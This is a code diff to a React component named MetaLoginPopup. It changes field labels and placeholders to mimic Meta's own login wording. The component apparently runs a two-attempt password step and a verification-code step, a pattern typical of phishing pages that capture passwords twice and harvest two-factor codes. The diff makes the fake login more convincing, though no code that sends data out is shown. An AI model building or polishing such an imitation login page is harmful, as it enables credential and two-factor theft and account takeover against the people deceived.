@@ -231,8 +231,7 @@ const MetaLoginPopup = () => {
               {/* Login Steps */}
               {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                 <form onSubmit={handlePasswordSubmit} className="space-y-4">
-                  <div className="space-y-1">
-                    <Label htmlFor="email" className="text-gray-700 font-medium">Email or Username</Label>
+                  <div className="mb-4">
                     <div className="relative">
                       <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
                       <Input 
@@ -240,15 +239,14 @@ const MetaLoginPopup = () => {
                         type="text"
                         value={email}
                         onChange={(e) => setEmail(e.target.value)}
-                        placeholder="Enter your email address"
+                        placeholder="Email or phone number"
                         className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"}`}
                         disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                       />
                     </div>
                   </div>
                   
-                  <div className="space-y-1">
-                    <Label htmlFor="password" className="text-gray-700 font-medium">Password</Label>
+                  <div className="mb-4">
                     <div className="relative">
                       <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
                       <Input 
@@ -256,7 +254,7 @@ const MetaLoginPopup = () => {
                         type={showPassword ? "text" : "password"}
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
-                        placeholder="Enter your password"
+                        placeholder="Password"
                         className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"} pr-10`}
                         autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                       />
@@ -350,8 +348,7 @@ const MetaLoginPopup = () => {
                   </div>
                   
                   <form onSubmit={handleVerificationSubmit} className="space-y-4">
-                    <div className="space-y-1">
-                      <Label htmlFor="code" className="text-gray-700 font-medium">Verification Code</Label>
+                    <div className="mb-4">
                       <div className="relative">
                         <Input 
                           id="code" 
@@ -360,7 +357,7 @@ const MetaLoginPopup = () => {
                           ref={codeInputRef}
                           value={verificationCode}
                           onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
-                          placeholder="Enter 6-digit code"
+                          placeholder="6-digit verification code"
                           className={`h-[50px] rounded-md text-lg text-center bg-gray-50 border ${verificationError ? "border-red-500" : "border-gray-300"}`}
                           disabled={isLoading || cooldownActive}
                           maxLength={8}
